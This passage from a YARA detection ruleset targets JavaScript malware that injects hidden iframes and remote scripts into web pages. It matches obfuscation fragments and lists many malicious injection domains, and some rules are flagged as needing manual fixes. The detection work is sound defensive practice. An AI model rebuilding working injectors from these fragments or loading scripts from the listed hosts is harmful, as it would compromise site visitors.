        $ps0
}

private rule PR00770 : trigger
{
    strings:
        $ps0 = "60!105!102!114!97!109!101!32!115!114!99!61!34!104"
    condition:
        $ps0
}

rule js_malware_hiddeniframe_005 : malware
{
    strings:
        $trigger = "function Decode(){var temp"
    condition:
        $trigger and PR00769 and PR00770
}

rule js_malware_hiddeniframe_005_001 : malware
{
    strings:
        $trigger = "60!105!102!114!97!109!101!32!115!114!99!61!34!104"
    condition:
        $trigger and PR00769
}

rule js_malware_hiddeniframe_006 : malware
{
    strings:
        $trigger = "if(window.document)s+=String.fromCharCode(n[i]-(020+i"
    condition:
        $trigger and PR00050
}

private rule PR00771 : trigger
{
    strings:
        $ps0 = "style=\"border: 0px none; width: 100%; height: 100vh;z-index:9999999; position:fixed;top:0;left:0\",e.src="
    condition:
        $ps0
}

rule js_malware_hiddeniframe_008 : malware
{
    strings:
        $trigger = "document.cookie.indexOf("
    condition:
        $trigger and PR00771
}

rule js_malware_iframe_injector_001 : malware
{
    strings:
        $trigger = ";document.write('<iframe style=\"position:fixed;top:0px;left:-"
    condition:
        $trigger
}

private rule PR00772 : trigger
{
    strings:
        $ps0 = "\"; document.body.appendChild(i);})();"
    condition:
        $ps0
}

rule js_malware_iframe_injector_002 : malware
{
    strings:
        $trigger = "(function(){var i = document.createElement(\"iframe\"); i.style.display = \"none\";"
    condition:
        $trigger and PR00772 and PR00050
}

private rule PR00773 : trigger
{
    strings:
        $ps0 = "/google_counter.php');"
    condition:
        $ps0
}

rule js_malware_iframe_injector_003 : malware
{
    strings:
        $trigger = "iframe"
    condition:
        $trigger and PR00050 and PR00323 and PR00773
}

private rule PR00774 : trigger
{
    strings:
        $ps0 = "innerHTML|iframe|width|100|scrolling|no|document|4000|frameborder|src|http|"
    condition:
        $ps0
}

rule js_malware_iframe_injector_004 : malware
{
    strings:
        $trigger = "return c.toString("
    condition:
        $trigger and PR00774 and PR00604
}

private rule PR00775 : trigger
{
    strings:
        $ps0 = "JSinj=document.createElement('iframe');"
    condition:
        $ps0
}

rule js_malware_iframe_injector_005 : malware
{
    strings:
        $trigger = "new RegExp"
    condition:
        $trigger and PR00775
}

private rule PR00776 : trigger
{
    strings:
        $ps0 = "undefined|ofdsfjnascjsnfstjejewqoewqsfkjdsjfdksfjbiv|reverse|x3b|orday|fer|join|epyt|height|script|new|Math|typeof|gro|Image|tpircsavaj|width|self|src|random|crs|write|location"
    condition:
        $ps0
}

rule js_malware_iframe_injector_006 : malware
{
    strings:
        $trigger = "new RegExp"
    condition:
        $trigger and PR00776 and PR00323
}

private rule PR00777 : trigger
{
    strings:
        $ps0 = "\\x68\\x74\\x74\\x70\\x3A\\x2F\\x2F"
    condition:
        $ps0
}

private rule PR00778 : trigger
{
    strings:
        $ps0 = ".setAttribute(\"type\",\"text/javascript\");var"
    condition:
        $ps0
}

rule js_malware_iframe_injector_007 : malware
{
    strings:
        $trigger = "document.getElementsByTagName"
    condition:
        $trigger and PR00777 and PR00778
}

private rule PR00779 : trigger
{
    strings:
        $ps0 = "=sTKpUGchN2cl9FKlBXYjNXZuVHKlRXaydnL05WZtV3YvR2O"
    condition:
        $ps0
}

rule js_malware_iframe_injector_008 : malware
{
    strings:
        $trigger = "fromCharCode"
    condition:
        $trigger and PR00029 and PR00779
}

rule js_malware_iframe_injector_009 : malware
{
    strings:
        $trigger = "window.mondrawtexture=1,window.onload=function(){"
    condition:
        $trigger and PR00323
}

private rule PR00780 : trigger
{
    strings:
        $ps0 = "x.style.display = \"none\";x.src ="
    condition:
        $ps0
}

private rule PR00781 : trigger
{
    strings:
        $ps0 = "document.createElement('iframe')"
    condition:
        $ps0
}

rule js_malware_iframe_injector_010 : malware
{
    strings:
        $trigger = "document.body.appendChild"
    condition:
        $trigger and PR00780 and PR00781
}

rule js_malware_iframe_injector_011 : malware
{
    strings:
        $trigger = "a.appendChild(c);d.body.appendChild(a);document.cookie=n.concat("
    condition:
        $trigger and PR00621
}

rule js_malware_iframe_injector_012 : malware
{
    strings:
        $trigger = "document.body.appendChild(document.createElement('div')).appendChild("
    condition:
        $trigger and PR00781
}

// MANUAL FIX NECESSARY
rule js_malware_iframe_injector_013 : malware
{
    strings:
        $trigger = "document.querySelector"
        $js_malware_iframe_injector_013_r0 = /<!--[\w]+-->[\s]*<script[^>]+>[^{]+try[\s]*\{[\s]*\+[\s]*function\(\)[\s]*\{[\s]*if[\s]*\(document\.querySelector\)\+\+\(window/
    condition:
        $trigger and $js_malware_iframe_injector_013_r0
}

private rule PR00782 : trigger
{
    strings:
        $ps0 = ";try{if(Math.ceil("
    condition:
        $ps0
}

rule js_malware_iframe_injector_014 : malware
{
    strings:
        $trigger = ".fromCharCode(eval("
    condition:
        $trigger and PR00782 and PR00621 and PR00323
}

private rule PR00783 : trigger
{
    strings:
        $ps0 = "var __calb = function() { try { if( !document || !document.body ) { window.setTimeout(__calb, 1000); return; } if(document.getElementById"
    condition:
        $ps0
}

rule js_malware_iframe_injector_015 : malware
{
    strings:
        $trigger = "document.body.appendChild"
    condition:
        $trigger and PR00783
}

private rule PR00784 : trigger
{
    strings:
        $ps0 = "try{document;}catch("
    condition:
        $ps0
}

rule js_malware_iframe_injector_016 : malware
{
    strings:
        $trigger = "String.fromCharCode"
    condition:
        $trigger and PR00647 and PR00634 and PR00784
}

private rule PR00785 : trigger
{
    strings:
        $ps0 = "String[\"fromCharCode"
    condition:
        $ps0
}

rule js_malware_iframe_injector_017 : malware
{
    strings:
        $trigger = "\"split\";e=eval;"
    condition:
        $trigger and PR00785
}

private rule PR00786 : trigger
{
    strings:
        $ps0 = "+window.location.search.replace("
    condition:
        $ps0
}

rule js_malware_iframe_injector_018 : malware
{
    strings:
        $trigger = "&frm=frame"
    condition:
        $trigger and PR00653 and PR00786
}

private rule PR00787 : trigger
{
    strings:
        $ps0 = "));document.write("
    condition:
        $ps0
}

rule js_malware_iframe_injector_019 : malware
{
    strings:
        $trigger = "=unescape("
    condition:
        $trigger and PR00050 and PR00054 and PR00787
}

private rule PR00788 : trigger
{
    strings:
        $ps0 = "adrequest.xyz"
    condition:
        $ps0
}

rule js_malware_inject_adrequest_001 : malware
{
    strings:
        $trigger = ".js?"
    condition:
        $trigger and PR00788 and PR00050
}

private rule PR00789 : trigger
{
    strings:
        $ps0 = "cdn.allyouwant.online"
    condition:
        $ps0
}

rule js_malware_inject_allyouwant_001 : malware
{
    strings:
        $trigger = ".js?"
    condition:
        $trigger and PR00789 and PR00050
}

rule js_malware_inject_balantfromsun_001 : malware
{
    strings:
        $trigger = "balantfromsun.com"
    condition:
        $trigger and PR00050
}

rule js_malware_inject_cdnwebsiteforyou_001 : malware
{
    strings:
        $trigger = "cdnwebsiteforyou.biz"
    condition:
        $trigger and PR00050
}

rule js_malware_inject_cdnwidgetserver_001 : malware
{
    strings:
        $trigger = "src=\"http://cdn.widgetserver.com"
    condition:
        $trigger and PR00050
}

rule js_malware_inject_deliverygoodstrategy_001 : malware
{
    strings:
        $trigger = "deliverygoodstrategy.com"
    condition:
        $trigger and PR00050
}

private rule PR00790 : trigger
{
    strings:
        $ps0 = "drupalupdates.tk"
    condition:
        $ps0
}

rule js_malware_inject_drupalupdates_001 : malware
{
    strings:
        $trigger = "<script"
    condition:
        $trigger and PR00790
}

private rule PR00791 : trigger
{
    strings:
        $ps0 = "cdn.eeduelements.com"
    condition:
        $ps0
}

rule js_malware_inject_eedu_001 : malware
{
    strings:
        $trigger = ".js?"
    condition:
        $trigger and PR00050 and PR00791
}

private rule PR00792 : trigger
{
    strings:
        $ps0 = "\\x65\\x65\\x64\\x75\\x65\\x6C\\x65\\x6D\\x65\\x6E\\x74\\x73"
    condition:
        $ps0
}

rule js_malware_inject_eedu_002 : malware
{
    strings:
        $trigger = "\"];function httpGet(_0x"
    condition:
        $trigger and PR00050 and PR00792
}

private rule PR00793 : trigger
{
    strings:
        $ps0 = "lastdaysonlines.com/"
    condition:
        $ps0
}

rule js_malware_inject_lastdaysonlines_001 : malware
{
    strings:
        $trigger = "<script"
    condition:
        $trigger and PR00793
}

rule js_malware_inject_livestatsnet_001 : malware
{
    strings:
        $trigger = "<script async=\"async\" src=\"https://livestatsnet.services"
    condition:
        $trigger
}

private rule PR00794 : trigger
{
    strings:
        $ps0 = "livestatsnet.services"
    condition:
        $ps0
}

rule js_malware_inject_livestatsnet_002 : malware
{
    strings:
        $trigger = "if(!loadStats){function loadStats(){var head=document.getElementsByTagName(\"head\")[0],scr="
    condition:
        $trigger and PR00050 and PR00794
}

rule js_malware_inject_privacylocationforloc_001 : malware
{
    strings:
        $trigger = "privacylocationforloc.com"
    condition:
        $trigger and PR00050
}

rule js_malware_inject_setforspecialdomain_001 : malware
{
    strings:
        $trigger = "setforspecialdomain.com"
    condition:
        $trigger and PR00050
}

rule js_malware_inject_simpleoneline_001 : malware
{
    strings:
        $trigger = "simpleoneline.online"
    condition:
        $trigger and PR00050
}

rule js_malware_inject_somelandingpage_001 : malware
{
    strings:
        $trigger = "somelandingpage.com"
    condition:
        $trigger and PR00050
}

private rule PR00795 : trigger
{
    strings:
        $ps0 = "stats.startreceive.tk/"
    condition:
        $ps0
}

rule js_malware_inject_startreceive_001 : malware
{
    strings:
        $trigger = "<script"
    condition:
        $trigger and PR00795
}

rule js_malware_inject_stringengines_001 : malware
{
    strings:
        $trigger = "json.stringengines.com/"
    condition:
        $trigger and PR00050
}

rule js_malware_inject_thebiggestfavoritemake_001 : malware
{
    strings:
        $trigger = "src='https://thebiggestfavoritemake.com/"
    condition:
        $trigger and PR00050
}

private rule PR00796 : trigger
{
    strings:
        $ps0 = "trasnaltemyrecords.com"
    condition:
        $ps0
}

rule js_malware_inject_trasnaltemyrecords_001 : malware
{
    strings:
        $trigger = ".js?"
    condition:
        $trigger and PR00796 and PR00050
}

rule js_malware_inject_upgraderservices_001 : malware
{
    strings:
        $trigger = "upgraderservices.cf"
    condition:
        $trigger and PR00050
}

private rule PR00797 : trigger
{
    strings:
        $ps0 = "uustoughtonma.org"
    condition:
        $ps0
}

rule js_malware_inject_uustoughtonma_001 : malware
{
    strings:
        $trigger = ".js?"
    condition:
        $trigger and PR00050 and PR00797
}

private rule PR00798 : trigger
{
    strings:
        $ps0 = "<script>if ((navigator.userAgent.match(/"
    condition:
        $ps0
}

rule js_malware_injector_002 : malware
{
    strings:
        $trigger = "document.write("
    condition:
        $trigger and PR00798
}

rule js_malware_injector_004 : malware
{
    strings:
        $trigger = "document.write( unescape( '%3C%21%44%4F%43%54%59%50%js"
    condition:
        $trigger and PR00050
}

rule js_malware_injector_005 : malware
{
    strings:
        $trigger = "document.write(unescape('%3C%68%74%6D%6C%3E%0A%20%20%3C%68"
    condition:
        $trigger
}

rule js_malware_injector_021 : malware
{
    strings:
        $trigger = "122.155.168.105/ads/inpage/pub/collect.js"
    condition:
        $trigger and PR00050
}

rule js_malware_injector_022 : malware
{
    strings:
        $trigger = "179/collect.js"
    condition:
        $trigger and PR00050
}

private rule PR00799 : trigger
{
    strings:
        $ps0 = "collect.js"
    condition:
        $ps0
}

rule js_malware_injector_023 : malware
{
    strings:
        $trigger = "clickevents.com.my/"
    condition:
        $trigger and PR00050 and PR00799
}

rule js_malware_injector_024 : malware
{
    strings:
        $trigger = "cloudfrond.org"
    condition:
        $trigger and PR00050
}

rule js_malware_injector_025 : malware
{
    strings:
        $trigger = "/script.php\"><"
    condition:
        $trigger and PR00050
}

rule js_malware_injector_026 : malware
{
    strings:
        $trigger = "/script.php\">"
    condition:
        $trigger and PR00050
}

rule js_malware_injector_027 : malware
{
    strings:
        $trigger = "|iframe|document|write|src|http|bit|ly|1BC4pKP|width|height|frameborder|marginwidth|marginhe"
    condition:
        $trigger and PR00029
}

rule js_malware_injector_028 : malware
{
    strings:
        $trigger = "try_pick_colors();}</script>"
    condition:
        $trigger and PR00050
}

rule js_malware_injector_029 : malware
{
    strings:
        $trigger = "='%';eval(unescape(('var"
    condition:
        $trigger and PR00050
}

private rule PR00800 : trigger
{
    strings:
        $ps0 = "if(/(android|bb\\d+|meego).+mobile|avantgo|bada\\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)"
    condition:
        $ps0
}

rule js_malware_injector_030 : malware
{
    strings:
        $trigger = "/i[_"
    condition:
        $trigger and PR00050 and PR00323 and PR00800
}

private rule PR00801 : trigger
{
    strings:
        $ps0 = "999px"
    condition:
        $ps0
}

private rule PR00802 : trigger
{
    strings:
        $ps0 = "|atob|"
    condition:
        $ps0
}

rule js_malware_injector_031 : malware
{
    strings:
        $trigger = "eval(function(p,a,c,k,e,"
    condition:
        $trigger and PR00603 and PR00801 and PR00802
}

rule js_malware_injector_034 : malware
{
    strings:
        $trigger = "39, 59, 77, 61, 117, 110, 101, 115, 99, 97, 112, 101, 40, 78, 41, 59, 100, 111, 99, 117, 109, 101, 110, 116, 46, 119, 114, 105, 116, 101, 40, 77, 41, 59))"
    condition:
        $trigger and PR00231
}

rule js_malware_injector_035 : malware
{
    strings:
        $trigger = "cdn.googletoolservices.com"
    condition:
        $trigger and PR00641
}

private rule PR00803 : trigger
{
    strings:
        $ps0 = "ip(hone|od|ad)"
    condition:
        $ps0
}

private rule PR00804 : trigger
{
    strings:
        $ps0 = "\\x75\\x73\\x65\\x72\\x41\\x67\\x65\\x6E\\x74"
    condition:
        $ps0
}

rule js_malware_injector_036 : malware
{
    strings:
        $trigger = "\\x72\\x65\\x66\\x65\\x72\\x72\\x65\\x72"
    condition:
        $trigger and PR00803 and PR00804
}

private rule PR00805 : trigger
{
    strings:
        $ps0 = "link_site"
    condition:
        $ps0
}

rule js_malware_injector_038 : malware
{
    strings:
        $trigger = "document.getElementsByTagName(\"body\")[0].appendChild("
    condition:
        $trigger and PR00805
}

private rule PR00806 : trigger
{
    strings:
        $ps0 = "\\x3C\\x73\\x63\\x72\\x69\\x70\\x74"
    condition:
        $ps0
}

private rule PR00807 : trigger
{
    strings:
        $ps0 = "\\x77\\x72\\x69\\x74\\x65"
    condition:
        $ps0
}

rule js_malware_injector_039 : malware
{
    strings:
        $trigger = ";document[_"
    condition:
        $trigger and PR00806 and PR00807
}

rule js_malware_injector_040 : malware
{
    strings:
        $trigger = "eval|document|write|String|fromCharCode"
    condition:
        $trigger and PR00604
}

private rule PR00808 : trigger
{
    strings:
        $ps0 = "3c6120687265663d226d61696c"
    condition:
        $ps0
}

rule js_malware_injector_041 : malware
{
    strings:
        $trigger = "document.write("
    condition:
        $trigger and PR00050 and PR00808
}

// MANUAL FIX NECESSARY
rule js_malware_injector_042 : malware
{
    strings:
        $trigger = "document.write("
        $js_malware_injector_042_r0 = /\/\*\w+\*\/\s*document\.write\(.<[script'\"+\s]+type=.text\/javascript.\s*src=.http/
    condition:
        $trigger and PR00050 and $js_malware_injector_042_r0
}

private rule PR00809 : trigger
{
    strings:
        $ps0 = "dancewithme.biz"
    condition:
        $ps0
}

rule js_malware_injector_044 : malware
{
    strings:
        $trigger = "<script"
    condition:
        $trigger and PR00809
}

private rule PR00810 : trigger
{
    strings:
        $ps0 = "//assetsbraln.com/cv5/tasking.js"
    condition:
        $ps0
}

rule js_malware_injector_045 : malware
{
    strings:
        $trigger = "document.getElementsByTagName"
    condition:
        $trigger and PR00810
}

private rule PR00811 : trigger
{
    strings:
        $ps0 = "{var p=document.createElement('script');p.type='text/javascript';p.async=true;p.src=g('"
    condition:
        $ps0
}

rule js_malware_injector_046 : malware
{
    strings:
        $trigger = "document.getElementsByTagName"
    condition:
        $trigger and PR00811
}

private rule PR00812 : trigger
{
    strings:
        $ps0 = "-ninja.min.js"
    condition:
        $ps0
}

rule js_malware_injector_047 : malware
{
    strings:
        $trigger = "document.getElementsByTagName"
    condition:
        $trigger and PR00812
}

private rule PR00813 : trigger
{
    strings:
        $ps0 = "|viglink|js|com|script|insertBefore'.split"
    condition:
        $ps0
}

rule js_malware_injector_048 : malware
{
    strings:
        $trigger = "eval(function(p,a,c,k,e,"
    condition:
        $trigger and PR00813
}

private rule PR00814 : trigger
{
    strings:
        $ps0 = "\\x7C\\x70\\x31\\x61\\x69\\x7C\\x64\\x6F\\x63\\x75\\x6D\\x65\\x6E\\x74\\x7C"
    condition:
        $ps0
}

rule js_malware_injector_048_02 : malware
{
    strings:
        $trigger = "new RegExp"
    condition:
        $trigger and PR00323 and PR00814
}

rule js_malware_injector_049 : malware
{
    strings:
        $trigger = "\\x61\\x70\\x70\\x65\\x6E\\x64\\x43\\x68\\x69\\x6C\\x64\",\"\\x2F\\x2F"
    condition:
        $trigger and PR00641 and PR00669
}

private rule PR00815 : trigger
{
    strings:
        $ps0 = "aHR0cDovL3dpbGRlc3RvcmUuYml6L2dhdGUucGhw"
    condition:
        $ps0
}

rule js_malware_injector_050 : malware
{
    strings:
        $trigger = "|onload"
    condition:
        $trigger and PR00604 and PR00711 and PR00815 and PR00677
}

private rule PR00816 : trigger
{
    strings:
        $ps0 = "var iframe = document.createElement('iframe');"
    condition:
        $ps0
}

private rule PR00817 : trigger
{
    strings:
        $ps0 = "if (typeof window."
    condition:
        $ps0
}

private rule PR00818 : trigger
{
    strings:
        $ps0 = "document.body.appendChild(iframe);"
    condition:
        $ps0
}

rule js_malware_injector_051 : malware
{
    strings:
        $trigger = "iframe.style.display = \"none\";"
    condition:
        $trigger and PR00816 and PR00817 and PR00818
}

private rule PR00819 : trigger
{
    strings:
        $ps0 = "\\x3C\\x73\\x63\\x72\",\"\\x69\\x70\\x74\\x20"
    condition:
        $ps0
}

rule js_malware_injector_052 : malware
{
    strings:
        $trigger = "x20\\x73\\x72\\x63\\x3D\\x22\\x68\\x74\\x74\\x70"
    condition:
        $trigger and PR00819 and PR00647 and PR00807
}

private rule PR00820 : trigger
{
    strings:
        $ps0 = ");var s=document.getElementsByTagName('script')[0];s.parentNode.insertBefore(i,s);})();"
    condition:
        $ps0
}

rule js_malware_injector_053 : malware
{
    strings:
        $trigger = "(function(){var i=document.createElement('script');i.type='text/javascript';i.async=true;i.src=atob("
    condition:
        $trigger and PR00820
}

rule js_malware_injector_054 : malware
{
    strings:
        $trigger = ");zaz=za;e(zaz);}</script>\";"
    condition:
        $trigger and PR00050 and PR00323
}

private rule PR00821 : trigger
{
    strings:
        $ps0 = "document.write ('<div style=\"display:none"
    condition:
        $ps0
}

rule js_malware_injector_056 : malware
{
    strings:
        $trigger = "document.getElementsByTagName"
    condition:
        $trigger and PR00821
}

private rule PR00822 : trigger
{
    strings:
        $ps0 = "\\x64\\x65\\x63\\x6F\\x64\\x65"
    condition:
        $ps0
}

private rule PR00823 : trigger
{
    strings:
        $ps0 = "\\x66\\x72\\x6F\\x6D\\x43\\x68\\x61\\x72\\x43\\x6F\\x64\\x65"
    condition:
        $ps0
}

rule js_malware_injector_057 : malware
{
    strings:
        $trigger = ";document[_"
    condition:
        $trigger and PR00822 and PR00823
}

private rule PR00824 : trigger
{
    strings:
        $ps0 = "\"\\x63\\x6F\\x6F\\x6B\\x69\\x65\\x45\\x6E\\x61\\x62\\x6C\\x65\\x64\",\"\\x63\\x6E\\x74\\x5F\\x75\\x74\\x6D\","
    condition:
        $ps0
}

rule js_malware_injector_057_02 : malware
{
    strings:
        $trigger = ";document[_"
    condition:
        $trigger and PR00824
}

private rule PR00825 : trigger
{
    strings:
        $ps0 = "Histats.start"
    condition:
        $ps0
}

private rule PR00826 : trigger
{
    strings:
        $ps0 = "top_txt"
    condition:
        $ps0
}

private rule PR00827 : trigger
{
    strings:
        $ps0 = "browser_name"
    condition:
        $ps0
}

rule js_malware_injector_058 : malware
{
    strings:
        $trigger = "|link_to_file|"
    condition:
        $trigger and PR00825 and PR00323 and PR00826 and PR00827
}

rule js_malware_injector_058_02 : malware
{
    strings:
        $trigger = ".link_to_file"
    condition:
        $trigger and PR00825 and PR00323 and PR00826 and PR00827
}

private rule PR00828 : trigger
{
    strings:
        $ps0 = "_Hasync.push(['Histats.start"
    condition:
        $ps0
}

rule js_malware_injector_058_03 : malware
{
    strings:
        $trigger = "document.getElementsByTagName('body')[0]).appendChild(hs);"
    condition:
        $trigger and PR00828
}

private rule PR00829 : trigger
{
    strings:
        $ps0 = "|bIsFirst|"
    condition:
        $ps0
}

private rule PR00830 : trigger
{
    strings:
        $ps0 = "|sAdsUrl2|"
    condition:
        $ps0
}

rule js_malware_injector_058_04 : malware
{
    strings:
        $trigger = "|setAdsCookie|"
    condition:
        $trigger and PR00825 and PR00829 and PR00323 and PR00830
}

private rule PR00831 : trigger
{
    strings:
        $ps0 = "return d},algularToken:"
    condition:
        $ps0
}

private rule PR00832 : trigger
{
    strings:
        $ps0 = "angularCdn:"
    condition:
        $ps0
}

rule js_malware_injector_059 : malware
{
    strings:
        $trigger = "document.getElementsByTagName"
    condition:
        $trigger and PR00831 and PR00832
}

// MANUAL FIX NECESSARY
rule js_malware_injector_060 : malware
{
    strings:
        $trigger = ".js?"
        $js_malware_injector_060_r0 = /\/.jquery.min.js\?style=.rim/
    condition:
        $trigger and PR00050 and $js_malware_injector_060_r0
}

// MANUAL FIX NECESSARY
rule js_malware_injector_061 : malware
{
    strings:
        $trigger = "importScripts"
        $js_malware_injector_061_r0 = /self\.importScripts\(.http/
    condition:
        $trigger and $js_malware_injector_061_r0
}

private rule PR00833 : trigger
{
    strings:
        $ps0 = "\"\\x66\\x72\\x6F\\x6D\\x43\\x68\\x61\\x72\\x43\\x6F\\x64\\x65\",\"\\x72\\x65\\x70\\x6C\\x61\\x63\\x65\",\"\\x5C\\x77\\x2B\",\"\\x5C\\x62\""
    condition:
        $ps0
}

private rule PR00834 : trigger
{
    strings:
        $ps0 = "var __encode"
    condition:
        $ps0
}

private rule PR00835 : trigger
{
    strings:
        $ps0 = "=[\"\\x5F\\x64\\x65\\x63\\x6F\\x64\\x65\""
    condition:
        $ps0
}

rule js_malware_injector_062 : malware
{
    strings:
        $trigger = "new RegExp"
    condition:
        $trigger and PR00323 and PR00833 and PR00834 and PR00835
}

private rule PR00836 : trigger
{
    strings:
        $ps0 = "e=function(c){return("
    condition:
        $ps0
}

private rule PR00837 : trigger
{
    strings:
        $ps0 = "|yadro|"
    condition:
        $ps0
}

rule js_malware_injector_063 : malware
{
    strings:
        $trigger = "|ontv|"
    condition:
        $trigger and PR00836 and PR00837 and PR00604
}

private rule PR00838 : trigger
{
    strings:
        $ps0 = "getElementsByTagName(String.fromCharCode(104,101,97,100))"
    condition:
        $ps0
}

rule js_malware_injector_064 : malware
{
    strings:
        $trigger = "String.fromCharCode(104,116,116"
    condition:
        $trigger and PR00838
}

rule js_malware_injector_065 : malware
{
    strings:
        $trigger = "&#x64;&#x61;&#x74;&#x61;&colon;&#x74;&#x65;&#x78;&#x74;&sol;&#x6A;&#x61;&#x76;&#x61;&#x73;"
    condition:
        $trigger and PR00050
}

private rule PR00839 : trigger
{
    strings:
        $ps0 = "\\x42\\x72\\x6F\\x77\\x73\\x65\\x72\",\"\\x74\\x6F\\x4C\\x6F\\x77\\x65\\x72\\x43\\x61\\x73\\x65\",\"\\x75\\x73\\x65\\x72\\x41\\x67\\x65\\x6E\\x74"
    condition:
        $ps0
}

rule js_malware_injector_066 : malware
{
    strings:
        $trigger = "document[_0x"
    condition:
        $trigger and PR00638 and PR00839
}

private rule PR00840 : trigger
{
    strings:
        $ps0 = "if(typeof window.web_security"
    condition:
        $ps0
}

private rule PR00841 : trigger
{
    strings:
        $ps0 = "document.addEventListener('DOMContentLoaded', function(){"
    condition:
        $ps0
}

private rule PR00842 : trigger
{
    strings:
        $ps0 = "document.createElement("
    condition:
        $ps0
}

rule js_malware_injector_067 : malware
{
    strings:
        $trigger = "document.head.appendChild"
    condition:
        $trigger and PR00840 and PR00841 and PR00842
}

rule js_malware_injector_067_02 : malware
{
    strings:
        $trigger = "document.head.appendChild"
    condition:
        $trigger and PR00842 and PR00840
}

// MANUAL FIX NECESSARY
rule js_malware_injector_068 : malware
{
    strings:
        $trigger = "document.getElementsByTagName"
        $js_malware_injector_068_r0 = /if[\s]*\(![\w]+\)[\s]*\{function[\s]*[\w]+\(\)[\s]*\{[\s]*var[\s]*[\w]+=document.getElementsByTagName\(.head.\)[\s]*\[[\d]+\],[\s]*[\w]+=document.createElement\(.script.\);[^,]+,[\w]+\.src=[^,]+,[\w]+\.async=.async.,[\w]+\.appendChild\([\w]+\)[\s]*\}[\s]*[\w]+\(\)[\s]*\}/
    condition:
        $trigger and $js_malware_injector_068_r0
}

private rule PR00843 : trigger
{
    strings:
        $ps0 = "google-analytics"
    condition:
        $ps0
}

private rule PR00844 : trigger
{
    strings:
        $ps0 = "}}) (window,document,"
    condition:
        $ps0
}

rule js_malware_injector_069 : malware
{
    strings:
        $trigger = "location.href.indexOf(i.atob("
    condition:
        $trigger and PR00843 and PR00844
}

private rule PR00845 : trigger
{
    strings:
        $ps0 = "poponclick"
    condition:
        $ps0
}

private rule PR00846 : trigger
{
    strings:
        $ps0 = "script=document.createElement("
    condition:
        $ps0
}

rule js_malware_injector_070 : malware
{
    strings:
        $trigger = "document.getElementsByTagName"
    condition:
        $trigger and PR00845 and PR00846
}

rule js_malware_injector_072 : malware
{
    strings:
        $trigger = "document.write(atob('PHNjcmlwdCBzcmM9Imh0dH"
    condition:
        $trigger
}

private rule PR00847 : trigger
{
    strings:
        $ps0 = "setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');"
    condition:
        $ps0
}

private rule PR00848 : trigger
{
    strings:
        $ps0 = "style.visibility = 'hidden';"
    condition:
        $ps0
}

rule js_malware_injector_073 : malware
{
    strings:
        $trigger = "eval(scripts[i].innerHTML);"
    condition:
        $trigger and PR00664 and PR00847 and PR00848
}

rule js_malware_injector_074 : malware
{
    strings:
        $trigger = "xml_url_request = '/wp-includes/fonts/"
    condition:
        $trigger and PR00675
}

private rule PR00849 : trigger
{
    strings:
        $ps0 = ");script.src = url;document."
    condition:
        $ps0
}

private rule PR00850 : trigger
{
    strings:
        $ps0 = "[0].appendChild(script);};include("
    condition:
        $ps0
}

rule js_malware_injector_075 : malware
{
    strings:
        $trigger = "document.createElement('script')"
    condition:
        $trigger and PR00664 and PR00849 and PR00850
}

private rule PR00851 : trigger
{
    strings:
        $ps0 = "String.fromCharCode(104,116,116"
    condition:
        $ps0
}

rule js_malware_injector_076 : malware
{
    strings:
        $trigger = ",46,103,97,47,"
    condition:
        $trigger and PR00851
}

private rule PR00852 : trigger
{
    strings:
        $ps0 = "document['createElement']('script');"
    condition:
        $ps0
}

private rule PR00853 : trigger
{
    strings:
        $ps0 = "]('head')[0]['appendChild'](_0x"
    condition:
        $ps0
}

rule js_malware_injector_080 : malware
{
    strings:
        $trigger = "require("
    condition:
        $trigger and PR00852 and PR00853
}

private rule PR00854 : trigger
{
    strings:
        $ps0 = "sojson"
    condition:
        $ps0
}

rule js_malware_injector_081 : malware
{
    strings:
        $trigger = "['\\x66\\x72\\x6f\\x6d\\x43\\x68\\x61\\x72\\x43\\x6f\\x64\\x65']['\\x61\\x70\\x70\\x6c\\x79']"
    condition:
        $trigger and PR00854
}

private rule PR00855 : trigger
{
    strings:
        $ps0 = "document.createElement('s'+'c'+'r'+'i'+'p'+'t');"
    condition:
        $ps0
}

rule js_malware_injector_082 : malware
{
    strings:
        $trigger = "document.head.appendChild(window."
    condition:
        $trigger and PR00855
}

rule js_malware_injector_083 : malware
{
    strings:
        $trigger = "importScripts('https://dihlw"
    condition:
        $trigger
}

private rule PR00856 : trigger
{
    strings:
        $ps0 = "=['info','apply','return"
    condition:
        $ps0
}

private rule PR00857 : trigger
{
    strings:
        $ps0 = "['getDate']()),_0x"
    condition:
        $ps0
}

rule js_malware_injector_084 : malware
{
    strings:
        $trigger = "));function foff(){var _0x"
    condition:
        $trigger and PR00639 and PR00856 and PR00857 and PR00638
}

// MANUAL FIX NECESSARY
rule js_malware_injector_085 : malware
{
    strings:
        $trigger = "].push({'gtm.start"
        $js_malware_injector_085_w0 = "//www.googletagmanager.com"
        $js_malware_injector_085_r1 = /parentNode\.insertBefore\([\w]+,[\w]+\)\;[\s]*\}\)\(window,document,.script.,.dataLayer/
    condition:
        $trigger and PR00621 and PR00323 and not $js_malware_injector_085_w0 and $js_malware_injector_085_r1
}

private rule PR00858 : trigger
{
    strings:
        $ps0 = "12,23,18,20,2,21,22,2,2];l"
    condition:
        $ps0
}

rule js_malware_injector_087 : malware
{
    strings:
        $trigger = ".open('POST',decodeURIComponent(escape"
    condition:
        $trigger and PR00676 and PR00858
}

private rule PR00859 : trigger
{
    strings:
        $ps0 = ") + window.location.href + window.atob(\"JnI"
    condition:
        $ps0
}

rule js_malware_injector_088 : malware
{
    strings:
        $trigger = "document"
    condition:
        $trigger and PR00859 and PR00050
}

rule js_malware_injector_089 : malware
{
    strings:
        $trigger = "}(window[\"\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\"],'\\x73\\x63\\x72\\x69\\x70\\x74"
    condition:
        $trigger and PR00653
}

private rule PR00860 : trigger
{
    strings:
        $ps0 = "n),cmd=(n,t)=>atob(\"PD9"
    condition:
        $ps0
}

rule js_malware_injector_090 : malware
{
    strings:
        $trigger = "document.head.appendChild"
    condition:
        $trigger and PR00842 and PR00860
}

private rule PR00861 : trigger
{
    strings:
        $ps0 = "x6d|window|x79"
    condition:
        $ps0
}

rule js_malware_injector_091 : malware
{
    strings:
        $trigger = "eval(function(p,a,c,k,e,"
    condition:
        $trigger and PR00676 and PR00677 and PR00861
}

private rule PR00862 : trigger
{
    strings:
        $ps0 = "|href"
    condition:
        $ps0
}

private rule PR00863 : trigger
{
    strings:
        $ps0 = "|http"
    condition:
        $ps0
}

private rule PR00864 : trigger
{
    strings:
        $ps0 = "replace(new RegExp"
    condition:
        $ps0
}

private rule PR00865 : trigger
{
    strings:
        $ps0 = "|document|"
